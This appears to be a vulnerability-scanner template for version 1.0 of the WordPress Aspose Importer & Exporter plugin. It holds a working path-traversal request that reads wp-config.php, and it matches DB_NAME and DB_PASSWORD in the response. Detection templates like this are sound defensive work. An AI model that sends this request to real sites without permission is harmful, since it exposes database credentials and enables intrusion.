id: aspose-ie-file-download
name: WordPress Aspose Importer & Exporter 1.0 - Local File Inclusion
severity: high
confidence: tentative
description: WordPress Aspose Importer & Exporter version 1.0 is vulnerable to local file inclusion.
reference: https://packetstormsecurity.com/files/131162/
tags:
- aspose
- packetstorm
- wordpress
- wp-plugin
- lfi
- vuln
requests:
- method: GET
  path: /wp-content/plugins/aspose-importer-exporter/aspose_import_export_download?file=../../../wp-config.php
  matchers:
  - type: body
    words:
    - DB_NAME
    - DB_PASSWORD
  - type: status
    status:
    - 200
  condition: and
